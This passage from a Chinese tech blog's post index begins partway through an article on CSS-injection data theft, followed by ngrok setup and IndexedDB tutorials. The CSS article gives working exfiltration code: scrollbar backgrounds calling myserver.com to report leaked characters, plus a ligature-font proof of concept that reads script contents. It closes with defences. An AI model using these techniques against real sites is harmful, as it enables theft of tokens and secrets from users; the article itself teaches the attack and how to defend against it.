能做到的事情是一樣的。\n那要怎麼解決順序的問題呢？\n我們可以先把 div 的寬度縮減到只能顯示一個字元，這樣其他字元就會被放到第二行去，再搭配 ::first-line 這個 selector，就可以特別針對第一行做樣式的調整，像是這樣：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;fa\u0026#34;; src:local(\u0026#39;Comic Sans MS\u0026#39;); font-style:monospace; unicode-range: U+41; } div { font-size: 0px; height: 40px; width: 20px; font-family: fa, \u0026#34;Courier New\u0026#34;; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; } div::first-line{ font-size: 30px; } \u0026lt;/style\u0026gt; Secret: \u0026lt;div\u0026gt;CBAD\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 畫面上你就只會看到一個「C」的字元，因為我們先用 font-size: 0px 把所有字元的尺寸都設為 0，再用 div::first-line 去做調整，讓第一行的 font-size 變成 30px。換句話說，只有第一行的字元能看到，而現在的 div 寬度只有 20px，所以只會出現第一個字元。\n接著，我們再運用剛剛學會的那招，去載入看看不同的字體。當我載入 fa 這個字體時，因為畫面上沒有出現 A，所以不會有任何變化。但是當我載入 fc 這個字體時，畫面上有 C，所以就會用 Comic Sans MS 來顯示 C，高度就會變高，scrollbar 就會出現，就可以利用它來發出 request，像這樣：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 div { font-size: 0px; height: 40px; width: 20px; font-family: fc, \u0026#34;Courier New\u0026#34;; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; --leak: url(http://myserver.com?C); } div::first-line{ font-size: 30px; } div::-webkit-scrollbar { background: blue; } div::-webkit-scrollbar:vertical { background: var(--leak); } 那我們要怎麼樣不斷使用新的 font-family 呢？用 CSS animation 就可以做到，你可以用 CSS animation 不斷載入不同的 font-family 以及指定不同的 –leak 變數。\n如此一來，我們就能知道畫面上的第一個字元到底是什麼。\n知道了第一個字元以後，我們把 div 的寬度變長，例如說變成 40px，就能容納兩個字元，因此第一行就會是前兩個字，接著再用一樣的方式載入不同的 font-family，就能 leak 出第二個字元，詳細流程如下：\n假設畫面上是 ACB 調整寬度為 20px，第一行只出現第一個字元 A 載入字體 fa，因此 A 用較高的字體顯示，出現 scrollbar，載入 scrollbar 背景，傳送 request 給 server 載入字體 fb，但是 B 沒有出現在畫面上，因此沒有任何變化。 載入字體 fc，但是 C 沒有出現在畫面上，因此沒有任何變化。 調整寬度為 40px，第一行出現兩個字元 AC 載入字體 fa，因此 A 用較高的字體顯示，出現 scrollbar，此時應該是因為這個背景已經載入過，所以不會發送新的 request 載入字體 fb，沒出現在畫面上，沒任何變化 載入字體 fc，C 用較高的字體顯示，出現 scrollbar 並且載入背景 調整寬度為 60px，ACB 三個字元都出現在第一行 載入字體 fa，同第七步 載入字體 fb，B 用較高的字體顯示，出現 scrollbar 並且載入背景 載入字體 fc，C 用較高的字體顯示，但因為已經載入過相同背景，不會發送 request 結束 從上面流程中可以看出 server 會依序收到 A, C, B 三個 reqeust，代表了畫面上字元的順序。而不斷改變寬度以及 font-family 都可以用 CSS animation 做到。\n想要看完整 demo 的可以看這個網頁（出處：What can we do with single CSS injection?）：https://demo.vwzq.net/css2.html\n這個解法雖然解決了「不知道字元順序」的問題，但依然無法解決重複字元的問題，因為重複的字元不會再發出 request。\n大絕招：ligature + scrollbar 先講結論，這一招可以解決上面所有問題，達成「知道字元順序，也知道重複字元」的目標，能夠偷到完整的文字。\n要理解怎麼偷之前，我們要先知道一個專有名詞，叫做連字（ligature），在某些字型當中，會把一些特定的組合 render 成連在一起的樣子，如下圖（來源：wikipedia）：\n那這個對我們有什麼幫助呢？\n我們可以自己製作出一個獨特的字體，把 ab 設定成連字，並且 render 出一個超寬的元素。接著，我們把某個 div 寬度設成固定，然後結合剛剛 scrollbar 那招，也就是：「如果 ab 有出現，就會變很寬，scrollbar 就會出現，就可以載入 request 告訴 server；如果沒出現，那 scrollbar 就不會出現，沒有任何事情發生」。\n流程是這樣的，假設畫面上有 acc 這三個字：\n載入有連字 aa 的字體，沒事發生 載入有連字 ab 的字體，沒事發生 載入有連字 ac 的字體，成功 render 超寬的畫面，scrollbar 出現，載入 server 圖片 server 知道畫面上有 ac 載入有連字 aca 的字體，沒事發生 載入有連字 acb 的字體，沒事發生 載入有連字 acc 的字體，成功 render，scrollbar 出現，傳送結果給 server server 知道畫面上有 aca 透過連字結合 scrollbar，我們可以一個字元一個字元，慢慢 leak 出畫面上所有的字，甚至連 JavaScript 的程式碼都可以！\n你知道，script 的內容是可以顯示在畫面上的嗎？\n1 2 3 head, script { display: block; } 只要加上這個 CSS，就可以讓 script 內容也顯示在畫面上，因此我們也可以利用同樣的技巧，偷到 script 的內容！\n在實戰上的話，你可以用 SVG 搭配其他工具，在 server 端迅速產生字體，想要看細節以及相關程式碼的話，可以參考這篇：Stealing Data in Great style – How to Use CSS to Attack Web Application.\n而這邊我就簡單做個簡化到不行的 demo，來證明這件事情是可行的。為了簡化，有人做了一個 Safari 版本的 demo，因為 Safari 支援 SVG font，所以不需要再從 server 產生字型，原始文章在這裡：Data Exfiltration via CSS + SVG Font - PoC (Safari only)\n簡易版 demo：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; var secret = \u0026#34;abc123\u0026#34; \u0026lt;/script\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;script\u0026gt; var secret2 = \u0026#34;cba321\u0026#34; \u0026lt;/script\u0026gt; \u0026lt;svg\u0026gt; \u0026lt;defs\u0026gt; \u0026lt;font horiz-adv-x=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;font-face font-family=\u0026#34;hack\u0026#34; units-per-em=\u0026#34;1000\u0026#34; /\u0026gt; \u0026lt;glyph unicode=\u0026#39;\u0026#34;a\u0026#39; horiz-adv-x=\u0026#34;99999\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;/font\u0026gt; \u0026lt;/defs\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;style\u0026gt; script { display: block; font-family:\u0026#34;hack\u0026#34;; white-space:n owrap; overflow-x: auto; width: 500px; background:lightblue; } script::-webkit-scrollbar { background: blue; } \u0026lt;/style\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 我用 script 放了兩段 JS，裡面內容分別是 var secret = \u0026quot;abc123\u0026quot; 跟 var secret2 = \u0026quot;cba321\u0026quot;，接著利用 CSS 載入我準備好的字體，只要有 \u0026quot;a 的連字，就會寬度超寬。\n再來如果 scrollbar 有出現，我把背景設成藍色的，比較顯眼，最後的結果如下：\n上面因為內容是 var secret = \u0026quot;abc123\u0026quot;，所以符合了 \u0026ldquo;a 的連字，因此寬度變寬，scrollbar 出現。\n下面因為沒有 \u0026quot;a，所以 scrollbar 沒出現（有 a 的地方都會缺字，應該跟我沒有定義其他的 glyph 有關，但不影響結果）\n只要把 scrollbar 的背景換成 URL，就可以從 server 端知道 leak 的結果。\n如果想看實際的 demo 跟 server 端的寫法，可以參考上面附的那兩篇文章。\n防禦方式 最後我們來講一下防禦方式，最簡單明瞭的當然就是直接把 style 封起來不給用，基本上就不會有 CSS injection 的問題（除非實作方式有漏洞）。\n如果真的要開放 style，也可以用 CSP 來阻擋一些資源的載入，例如說 font-src 就沒有必要全開，style-src 也可以設置 allow list，就能夠擋住 @import 這個語法。\n再來，也可以考慮到「如果頁面上的東西被拿走，會發生什麼事情」，例如說 CSRF token 被拿走，最壞就是 CSRF，此時就可以實作更多的防護去阻擋 CSRF，就算攻擊者取得了 CSRF token，也沒辦法 CSRF（例如說多檢查 origin header 之類的）。\n總結 CSS 果真博大精深，真的很佩服這些前輩們可以把 CSS 玩出這麼多花樣，發展出這麼多令人眼界大開的攻擊手法。當初在研究的時候，利用屬性選擇器去 leak 這個我可以理解，用 unicode-range 我也能理解，但是那個用文字高度加上 CSS animation 去變化的，我花了不少時間才搞懂那在幹嘛，連字那個雖然概念好懂，但真的要實作還是會碰到不少問題。\n最後，這兩篇文章主要算是介紹一下 CSS injection 這個攻擊手法，因此實際的程式碼並不多，而這些攻擊手法都參考自前人們的文章，列表我會附在下面，有興趣的話可以閱讀原文，會講得更詳細一點，如果對哪項攻擊想要深入了解，也可以留言跟我交流。\n","date":"2022-10-03T00:00:00Z","image":"https://live.staticflickr.com/65535/52401028978_fc63caee61_o.jpg","permalink":"https://wayneblog.ga/2022-10-03/css-injection/","title":"用 CSS 來偷資料 - CSS injection"},{"content":" 參考文章 Alan Tsai 的學習筆記 Ngrok：讓本機測試時也能有 HTTPS 憑證 前言 在開發的過程中，有時候會需要從另外一臺機器測試在local的網站及服務。最常見的情況就是當要測試網站在手機上看起來長什麽樣子的時候，或者有時候要讓別人連到自己local的sql serer的時候。 ngrok 就是讓這一切變得容易的工具，而且很佛心的是，免費版就夠一般使用。 運作模式 ngrok 就是一個 reverse proxy 的工具，透過把 local 的 port map 到一個 public 的地址，讓外部能夠透過這個 public 地址連到，然後工具用 reverse proxy 和 local 實際的 port 取得資料。 因此有個缺點，就是速度相對較慢，尤其是 ngrok 的伺服器在美國因此也會減少一些速度。不過如果是爲了開發測試用，這個就不算缺點。 ngrok 免費版本提供了一個動態的地址，需要進階功能或者同時map多個服務就需要付費。 安裝與使用 需先安裝 unzip (解壓縮用) 1 yum install zip unzip 步驟 1 - 到官網下載相對應系統的 ngrok 安裝包 1 2 ### 以 linux 64 為例 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip 步驟 2 - 解壓縮安裝包並搬移到 /usr/bin/ 中 1 unzip ngrok-stable-linux-amd64.zip 1 mv ngrok /usr/bin/. 步驟 3 - 到 ngrok 官網註冊一個免費帳號 步驟 4 - 將 dashboard 上顯示的 token 設定至本機 1 ngrok authtoken XXXXXXXXXXXXXXXX 顯示此畫面代表已設定完成。 步驟 5 - 假設服務跑在本機的 port 3000，則執行以下指令 1 ngrok http 3000 顯示此畫面代表已成功跑起服務，打開網址即可。 直到 ngrok 關掉或 ngrok session 過期之前，這兩個 URL 都可以被公開存取。 進階使用 外連的 web 服務加密 有時候給別人測試的鏈接不希望任意的人都能夠開啓，ngrok非常貼心的提供了這個服務。 只需要在 mapping 的時候加上 auth 這個參數就可以設定密碼保護。例如： 1 ngrok http --auth=admin:12345 3000 意思是，賬號要是admin，而密碼是12345 map 到 3000 port。 重寫 hostname 有些服務會使用到 hostname 的值，這個時候重寫 hostname 的功能就變得很重要。可以使用 host-header 做設定。 這邊的例子用的是在 IIS 裏面設定只有 test.com 才會 binding 到 80 port，使用的指令就是： 1 ngrok http --host-header=test.com 80 ","date":"2022-09-26T00:00:00Z","image":"https://live.staticflickr.com/65535/52384429631_a48959b2b8_o.png","permalink":"https://wayneblog.ga/2022-09-26/ngrok-basic/","title":"透過 ngrok 產生臨時用的網址到指定機器"},{"content":" 參考網站1\n參考網站2\nIndexedDB 介紹 key-value 的儲存形式，透過索引功能來高效率搜尋資料。 同源政策 same-origin policy：只能取用同網域下的資料。 Async API : 提供非同步 api，單線程的應用下取用資料時就不會有 block the main thread 的情況造成使用者體驗不佳。 transaction : 能夠確保大量寫入資料時的完整性，如果有單筆資料寫入失敗會全數 rollback。 相容性 大部分的瀏覽器都已經支援使用，參閱：When Can I Use IndexedDB 儲存限制 單一資料庫項目的容量/大小並沒有任何限制，但是各個 IndexedDB資料庫的容量就有限制，且根據各瀏覽器其限制會不同。\nChrome：允許瀏覽器使用多達總磁盤空間的60％。 您可以使用StorageManager API來確定可用的最大配額。 其他基於Chromium的瀏覽器可能允許該瀏覽器使用更多存儲空間。 Internet Explorer 10 和更高版本：最多可以存儲250MB，並且在使用了10MB以上時將提示用戶。 Firefox：允許一個來源最多使用2GB。 您可以使用StorageManager API來確定仍有多少可用空間。 Safari (both desktop and mobile) 似乎最多可容納1GB，達到限制後，Safari會提示用戶，以200MB為增量增加限制。 refer to storage-for-the-web\n資料鍵(Key) data type: string, date, float和 array 必須是能排序的值(無法處理多國語言字串排序) 物件存檔有三種方式產生資料鍵: 資料鍵產生器 (key generator)、資料鍵路徑 (key path) 以及指定值。 資料鍵產生器 (key generator)：用產生器自動產生資料鍵。 資料鍵路徑 (key path)：空字串或是javascript identifier（包含用 \u0026ldquo;.\u0026rdquo; 分隔符號的名稱）且路徑不能有空白 (實測過中文會被轉成空字串)。 基本操作步驟 操作IndexedDB的基本步驟建議如下： 開啟資料庫和交易(transaction) 建立物件存檔(object store) 發出資料庫操作請求，例如新增或取得資料 聆聽對應DOM事件等待操作完成 從result物件上取得結果進行其他工作 使用方式 1. 試驗瀏覽器的前綴標示 如果需要試驗瀏覽器的前綴標示，可以如下： 1 2 3 4 5 6 7 // In the following line, you should include the prefixes of implementations you want to test. window.indexedDB = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB; // DON\u0026#39;T use \u0026#34;var indexedDB = ...\u0026#34; if you\u0026#39;re not in a function. // Moreover, you may need references to some window.IDB* objects: window.IDBTransaction = window.IDBTransaction || window.webkitIDBTransaction || window.msIDBTransaction; window.IDBKeyRange = window.IDBKeyRange || window.webkitIDBKeyRange || window.msIDBKeyRange; // (Mozilla has never prefixed these objects, so we don\u0026#39;t need window.mozIDB*) 請注意瀏覽器前綴標示的實作可能不完整、有些問題或仍然遵守舊版標準，因此不建議在正式版程式碼中使用。與其宣稱支援又有問題，倒不如直接不支援。 1 2 3 if (!window.indexedDB) { window.alert(\u0026#34;Your browser doesn\u0026#39;t support a stable version of IndexedDB. Such and such feature will not be available.\u0026#34;); } 2. 開啟資料庫 1 2 3 4 5 6 7 8 9 // Let us open database let request = window.indexedDB.open(\u0026#34;DB名稱\u0026#34;, 3); request.onerror = function(event) { // Do something with request.errorCode! }; request.onsuccess = function(event) { // Do something with request.result! }; 開啟請求並不會立刻開啟資料庫或交易，呼叫open()方法會回傳一個IDBOpenDBRequest物件，這個物件擁有兩個事件(success 和 error)。大部分IndexedDB的非同步功能都會回傳一個IDBDatabase類物件，然後我們可以註冊成功和失敗事件處理器。 .open()方法第二個參數是資料庫版本，資料庫版本決定了資料庫結構，也就是資料庫物件存檔的結構。如果請求版本不存在(比如因為這是一個新資料庫或是資料庫版本已升級)，onupgradeneeded事件會被觸發，然後我們可以在onupgradeneeded事件處理器中再建立新的版本，下面升級資料庫版本有更詳細的說明。 3. 使用資料鍵產生器 當建立物件存檔時設定autoIncrement旗標為ture將啟動資料鍵產生器，預設上該旗標為false。 有了資料鍵產生器，當新增資料到物件存檔中，資料鍵產生器會自動幫我們產生資料鍵。資料鍵產生器產生的資料鍵由整數1開始，而基本上新產生的資料鍵是由前一個資料鍵加1產生。資料鍵的產生不會因為資料刪除或清空所有資料而重新開始起算，所以資料鍵值是一直累加上去的，除非資料庫操作中斷，整個交易作業被取消。 我們可以建立一個有資料鍵產生器的物件存檔如下： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // Open the indexedDB. var request = indexedDB.open(dbName, 3); request.onupgradeneeded = function (event) { var db = event.target.result; // Create another object store called \u0026#34;names\u0026#34; with the autoIncrement flag set as true. var objStore = db.createObjectStore(\u0026#34;names\u0026#34;, { autoIncrement : true }); // Because the \u0026#34;names\u0026#34; object store has the key generator, the key for the name value is generated automatically. // The added records would be like: // key : 1 =\u0026gt; value : \u0026#34;Bill\u0026#34; // key : 2 =\u0026gt; value : \u0026#34;Donna\u0026#34; for (var i in customerData) { objStore.add(customerData[i].name); } } 關於資料鍵產生器細節，請參考\u0026ldquo;W3C Key Generators\u0026rdquo;。\n4. 新增和刪除資料 在操作資料庫之前必須要先進行交易，交易來自資料庫物件，在交易中要指定涵蓋物件存檔範圍，然後也要決定是要變更資料庫或純粹讀取資料。 交易共有三種種類，分別是讀取(read-only)，讀寫(read/write), 以及版本變更(versionchange)，如果只需要讀資料最好只使用讀取(read-only)交易，因為讀取(read-only)交易可以多重同步進行。 創建資料庫後，如果要寫入資料請這麼做： 1 2 3 4 var transaction = db.transaction([\u0026#34;customers\u0026#34;], \u0026#34;readwrite\u0026#34;); // Note: Older experimental implementations use the deprecated constant IDBTransaction.READ_WRITE instead of \u0026#34;readwrite\u0026#34;. // In case you want to support such an implementation, you can just write: // var transaction = db.transaction([\u0026#34;customers\u0026#34;], IDBTransaction.READ_WRITE); 呼叫 transaction() 方法會回傳一個交易物件。transaction()第一個接受參數代表交易涵蓋的物件存檔，雖然傳入空陣列會讓交易涵蓋所有物件存檔，但請不要這麼做，因為根據正式標準傳入空陣列應該要導致InvalidAccessError錯誤；第二個參數代表交易種類，不傳入的話預設為讀取交易，本例要寫入資料庫所以傳入讀寫(\u0026ldquo;readwrite\u0026rdquo;)。 交易的生命週期和事件循環關係密切。當我們發起交易又回到事件循環中後，如果忽略，那麼交易將轉成結束，唯一保持交易存活的方法是在交易上發出請求；當請求完成後我們會收到DOM事件，假設請求結果成功，我們可以在事件的回呼函數(callback中)繼續進行交易，反之，如果我們沒有繼續進行交易，那麼交易將結束，也就是說只要尚有未完成請求的話，交易就會繼續存活，如果收到TRANSACTION_INACTIVE_ERR錯誤那便意謂著交易早已結束，我們錯過了繼續進行交易的機會。 交易能收到三種事件: 錯誤(error)、中斷(abort)以及完成(complete)，其中錯誤事件會向上傳遞，所以任何一個交易下轄的請求產生錯誤事件，該交易都會收到。如果交易收到錯誤事件時，瀏覽器預設行為會中斷交易，除非我們有在錯誤事件上呼叫preventDefault()阻擋瀏覽器預設行動，否則整筆交易都將取消、復原，這樣的設計告訴我們必須要思考如何處裡錯誤，或者說如果對每一個錯誤進行處裡過於麻煩，那麼至少加入一個概括性的錯誤處理器也是可以。只要不處裡錯誤或呼叫abort()，交易將取消、復原，然後中斷事件接著觸發，反之，當所有請求都完成後，我們會收到一個完成事件，所以說如果我們同時發起多項請求時，可以只追蹤單一交易而非個別請求，這樣會大大減輕我們的負擔。 有了交易之後便能夠從中取得物件存檔，有了物件存檔便能夠新增資料(請注意唯有在建立交易時指定的物件存檔能夠取得)。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // Do something when all the data is added to the database. transaction.oncomplete = function(event) { alert(\u0026#34;All done!\u0026#34;); }; transaction.onerror = function(event) { // Don\u0026#39;t forget to handle errors! }; var objectStore = transaction.objectStore(\u0026#34;customers\u0026#34;); for (var i in customerData) { var request = objectStore.add(customerData[i]); request.onsuccess = function(event) { // event.target.result == customerData[i].ssn; }; } 呼叫 add() 方法可以加入一筆新資料，呼叫後會回傳一個IDBRequest物件，即為上方範例中的request，如果新增成功，request的成功事件會被觸發，而成功事件物件中有一個result屬性，這個result值剛好就等於新資料的資料鍵，所以說上方範例中的event.target.result剛好就等於顧客的ssn值(因為我們用ssn屬性作為資料鍵路徑)。請注意add方法只在當物件存檔中沒有相同資料鍵資料存在時有用，如果想要更動或是直接覆蓋現存資料請呼叫put方法。 5. 移除資料 移除資料十分容易： 1 2 3 4 var request = db.transaction([\u0026#34;customers\u0026#34;], \u0026#34;readwrite\u0026#34;).objectStore(\u0026#34;customers\u0026#34;).delete(\u0026#34;444-44-4444\u0026#34;); request.onsuccess = function(event) { // It\u0026#39;s gone! }; 6. 讀取資料 要取資料庫內的資料有數種途徑，第一個最簡單的途徑就是提供資料鍵，呼叫 get() 方法取得資料： 1 2 3 4 5 6 7 8 9 10 var transaction = db.transaction([\u0026#34;customers\u0026#34;]); var objectStore = transaction.objectStore(\u0026#34;customers\u0026#34;); var request = objectStore.get(\u0026#34;444-44-4444\u0026#34;); request.onerror = function(event) { // Handle errors! }; request.onsuccess = function(event) { // Do something with the request.result! alert(\u0026#34;Name for SSN 444-44-4444 is \u0026#34; + request.result.name); }; 假設我們把錯誤處理放在資料庫層級，我們可以再縮短上面的程式碼如下： 1 2 3 db.transaction(\u0026#34;customers\u0026#34;).objectStore(\u0026#34;customers\u0026#34;).get(\u0026#34;444-44-4444\u0026#34;).onsuccess = function(event) { alert(\u0026#34;Name for SSN 444-44-4444 is \u0026#34; + event.target.result.name); }; 呼叫 transcation 方法而不指定模式會開啟讀取(readonly)模式，接著取得我們的目標物件存檔，輸入目標資料的資料鍵，呼叫get方法取得請求物件，然後在請求物件上註冊成功事件處理器，當作業成功後，成功事件會觸發，成功事件的物件中含有請求物件(event.target如上述範例)，請求物件中含有請求結果(event.target.result如上述範例)。 7. 使用指標(Cursor) 使用get方法需要知道資料鍵，如果想要一一存取物件存檔中的資料，我們可以利用指標： 1 2 3 4 5 6 7 8 9 10 11 var objectStore = db.transaction(\u0026#34;customers\u0026#34;).objectStore(\u0026#34;customers\u0026#34;); objectStore.openCursor().onsuccess = function(event) { var cursor = event.target.result; if (cursor) { alert(\u0026#34;Name for SSN \u0026#34; + cursor.key + \u0026#34; is \u0026#34; + cursor.value.name); cursor.continue(); } else { alert(\u0026#34;No more entries!\u0026#34;); } }; openCursor 方法第一個參數用來接受資料鍵範圍物件來限制存取資料範圍，第二個參數用來指定存取進行方向，像上面的範例程式便是以資料鍵由小到大之方向存取資料；呼叫openCursor方法後一樣會回傳一個請求物件，成功時成功事件會觸發，不過這裡有些地方要特別注意，當成功事件處裡函數被喚起時，指標物件(cursor)會存放在result屬性內(亦即上述event.target.result)，cursor物件下有兩個屬性，key屬性是資料鍵，value屬性是資料值，如果要取得下一份資料就呼叫cursor的continue()方法，然後cursor物件就會指向下一份資料，當沒有資料時，cursor會是undefined，當請求一開始便找沒有資料，result屬性也會是undefined。 以下用cursor存取一遍資料後放在陣列中的作法相當常見： 1 2 3 4 5 6 7 8 9 10 11 var customers = []; objectStore.openCursor().onsuccess = function(event) { var cursor = event.target.result; if (cursor) { customers.push(cursor.value); cursor.continue(); } else { alert(\u0026#34;Got all customers: \u0026#34; + customers); } }; Warning: 以下範例不是IndexedDB標準!\nMozilla瀏覽器自己做了一個 getAll() 方法來方便一次取得所有cursor下的資料值，這個方法相當方便，不過請小心未來它有可能會消失。以下程式碼的效果和上面的一樣： 1 2 3 objectStore.getAll().onsuccess = function(event) { alert(\u0026#34;Got all customers: \u0026#34; + event.target.result); }; 一一檢查cursor的value屬性較不利性能表現，因為物件是被動一一建立，然而呼叫 getAll()，Gecko一定要一次建立所有物件，所以如果想要一次取得所有物件的資料值陣列使用 getAll() 比較好，如果想要一一檢查每筆資料則請利用cursor的方法。 8. 使用索引 利用一定唯一的ssn碼作為資料鍵相當合乎邏輯(隱私權的問題先擱置一放，不在本文探討範圍)。不過當我們想要查詢使用者的名字的時候，如果沒有索引就需要一一檢查每一筆資料，十分沒有效率，所以我們可以建立name的索引。 1 2 3 4 var index = objectStore.index(\u0026#34;name\u0026#34;); index.get(\u0026#34;Donna\u0026#34;).onsuccess = function(event) { alert(\u0026#34;Donna\u0026#39;s SSN is \u0026#34; + event.target.result.ssn); }; 因為 name 不是唯一值，所以可能會有多筆資料符合\u0026quot;Donna\u0026quot;名字，此時呼叫 get() 會取得資料鍵最小值的資料。 9. 設定指標查詢範圍和方向 如果想要限定指標查詢範圍，那麼在乎叫 openCursor() 或 openKeyCursor() 時第一個參數要傳入 IDBKeyRange 物件以限制範圍。IDBKeyRange物件能夠只聚焦在單一資料鍵上或者一段上下限區間；上下限區間可以是封閉(含界限)或開放(不含界限)，請看以下範例： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // Only match \u0026#34;Donna\u0026#34; var singleKeyRange = IDBKeyRange.only(\u0026#34;Donna\u0026#34;); // Match anything past \u0026#34;Bill\u0026#34;, including \u0026#34;Bill\u0026#34; var lowerBoundKeyRange = IDBKeyRange.lowerBound(\u0026#34;Bill\u0026#34;); // Match anything past \u0026#34;Bill\u0026#34;, but don\u0026#39;t include \u0026#34;Bill\u0026#34; var lowerBoundOpenKeyRange = IDBKeyRange.lowerBound(\u0026#34;Bill\u0026#34;, true); // Match anything up to, but not including, \u0026#34;Donna\u0026#34; var upperBoundOpenKeyRange = IDBKeyRange.upperBound(\u0026#34;Donna\u0026#34;, true); // Match anything between \u0026#34;Bill\u0026#34; and \u0026#34;Donna\u0026#34;, but not including \u0026#34;Donna\u0026#34; var boundKeyRange = IDBKeyRange.bound(\u0026#34;Bill\u0026#34;, \u0026#34;Donna\u0026#34;, false, true); index.openCursor(boundKeyRange).onsuccess = function(event) { var cursor = event.target.result; if (cursor) { // Do something with the matches. cursor.continue(); } }; 有時候我們會想要由大到小查看資料而非預設由小到大方向，傳入第二個\u0026quot;prev\u0026quot;字串便能做到： 1 2 3 4 5 6 7 objectStore.openCursor(null, \u0026#34;prev\u0026#34;).onsuccess = function(event) { var cursor = event.target.result; if (cursor) { // Do something with the entries. cursor.continue(); } }; 由於\u0026quot;name\u0026quot;索引不具唯一性，所以一個名字下可能會出現多筆資料，此時如果想要避開這多筆資料，請傳入\u0026quot;nextunique\u0026quot;或\u0026quot;prevunique\u0026quot;做為第二個方向參數，當傳入之後，如一個名字下遇到多筆資料，則只有資料鍵最小的資料會被回傳。 1 2 3 4 5 6 7 index.openKeyCursor(null, \u0026#34;nextunique\u0026#34;).onsuccess = function(event) { var cursor = event.target.result; if (cursor) { // Do something with the entries. cursor.continue(); } }; 關於可傳入的方向參數，請參考IDBCursor常數。\n安全性 IndexedDB遵守同源政策，所以它綁定創建它的來源網站，其他來源網站無法存取。 就像對載入 \u0026lt;frame\u0026gt; 和 \u0026lt;iframe\u0026gt; 網頁的第三方cookie所設下的安全性和隱私權考量限制，IndexedDB無法在載入 \u0026lt;frame\u0026gt; 和 \u0026lt;iframe\u0026gt; 網頁上運作，詳情請見 bug 595307。 瀏覽器關閉風險 當瀏覽器關閉，例如使用者按下關閉鈕，任何未完成IndexedDB交易都將默默中止，這些交易不會完成，錯誤事件也不會觸發。既然瀏覽器可能隨時被關閉，我們無法完全指望任何特定交易一定會完成，或是依賴錯誤事件做出相應處理，針對這種狀況，我們需要注意： 每一筆交易結束後都應該要保持資料庫完整性，例如說，有一串使用者編輯項目清單正要存入資料庫，我們如果先在一個交易中清除舊清單，然後在另一個交易中存入新清單，那就會面臨到清除完就清單後，新清單存入交易還來不及回存，瀏覽器就關閉的風險，而這個時候資料庫裡面的清單資料將消失。所以比較好的做法應該是在同一筆交易中完成清除舊清單和存入新清單。 永遠不要在unload事件中執行資料庫交易，因為如果unload事件是觸發在瀏覽器關閉下，任何資料庫交易都不會發生，或許，瀏覽器(或分頁)打開時讀取資料庫，更新資料庫當使用者編輯資料，當瀏覽器(或分頁)關閉時儲存資料這樣的做法比較直覺，不過資料庫的操作是非同步進行地，所以瀏覽器關閉的執行會在資料庫操作前發生，進而中斷後續非同步的資料庫交易，所以在unload事件中執行資料庫交易是行不通地。 事實上不論瀏覽器是否正常關閉，都沒有任何方法保證IndexedDB交易能夠順利完成，請見 bug 870645。 範例練習：將聊天室推播訊息寫進 IndexedDB 建立db.js，並將操作 IndexedDB 整合至檔案中。 vue檔引入db.js，並一次僅撈最新50筆資料。 db.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 // 回傳是否支援 IndexedDB export function isSupportDB() { const indexedDB = window.indexedDB || window.webkitIndexedDB || window.mozIndexedDB || window.msIndexedDB return !!indexedDB } // 打開or建立DB export function openDB() { return new Promise((resolve, reject) =\u0026gt; { const request = indexedDB.open(\u0026#34;ChatDB\u0026#34;) // 打開or建立聊天室DB request.onerror = e =\u0026gt; { console.log(\u0026#34;idb create fail\u0026#34;) reject(e) } request.onsuccess = () =\u0026gt; { console.log(\u0026#34;idb create success\u0026#34;) DBObject = request.result resolve(DBObject) // 成功後返回DB物件 } request.onupgradeneeded = e =\u0026gt; { // 若版本已升級則重新建立DB物件，並返回DB物件 DBObject = e.target.result DBObject.createObjectStore(\u0026#34;chatData\u0026#34;, { keyPath: \u0026#34;index\u0026#34;, autoIncrement: true }) resolve(DBObject) } }) } // 取歷史聊天紀錄最新50筆 export function getHistory(num) { return new Promise(resolve =\u0026gt; { const objectStore = DBObject.transaction([\u0026#34;chatData\u0026#34;], \u0026#34;readonly\u0026#34;).objectStore(\u0026#34;chatData\u0026#34;) let getKey = objectStore.getAllKeys() getKey.onsuccess = () =\u0026gt; { let result = [] for (let i = getKey.result.length - num * 50 - 1; i \u0026gt; getKey.result.length - num * 50 - 50 - 1; i--) { let getItem = objectStore.get(getKey.result[i]) getItem.onsuccess = () =\u0026gt; { result.unshift(getItem.result) } } resolve(result) } // 一次撈全部資料 // const request = DBObject.transaction([\u0026#34;chatData\u0026#34;], \u0026#34;readonly\u0026#34;).objectStore(\u0026#34;chatData\u0026#34;).getAll() // request.onsuccess = () =\u0026gt; { // resolve(request.result) // } }) } // 收到推播將訊息寫入idb export function addToDB(data) { const request = DBObject.transaction([\u0026#34;chatData\u0026#34;], \u0026#34;readwrite\u0026#34;) request.objectStore(\u0026#34;chatData\u0026#34;).add(data) //数据写入成功的回调 request.onsuccess = () =\u0026gt; {} request.onerror = event =\u0026gt; { console.log(event) } } // 清除idb聊天紀錄 export function clearDB() { const request = DBObject.transaction([\u0026#34;chatData\u0026#34;], \u0026#34;readwrite\u0026#34;) 